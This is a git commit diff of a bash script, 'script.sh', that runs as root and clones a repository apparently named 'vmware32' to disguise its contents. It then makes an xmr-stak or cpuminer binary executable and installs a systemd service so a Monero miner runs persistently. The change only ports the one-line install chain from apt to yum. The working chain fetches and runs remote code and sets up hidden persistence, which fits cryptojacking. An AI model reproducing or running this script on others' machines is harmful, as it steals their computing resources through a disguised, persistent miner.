19e1bf270596fe95253171064536a163be4a7dc8
nokian5500 <nokian5500@gmail.com>
2018-06-05 22:32:30 -0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
-apt-get -y update && apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git && cd /root/ && sysctl -w vm.nr_hugepages=128 && git clone https://github.com/nokian5500/vmware32.git && cd vmware32 && chmod 777 xmr-stak && mv xmr1.service /lib/systemd/system/ && systemctl daemon-reload && systemctl enable xmr1.service && systemctl start xmr1.service && systemctl stop xmr1.service && systemctl restart xmr1.service
+yum -y update && yum -y install curl-devel openssl-devel gmp-devel automake autoconf pkg-config jansson-devel libssl-devel libgmp-devel make gcc git && cd /root/ &&  git clone https://github.com/nokian5500/vmware32.git cpu && cd cpu && chmod 777 cpuminer && chmod +x cpuminer && mv xmr1.service /etc/systemd/system/ && systemctl daemon-reload && systemctl enable xmr1.service && systemctl start xmr1.service
 
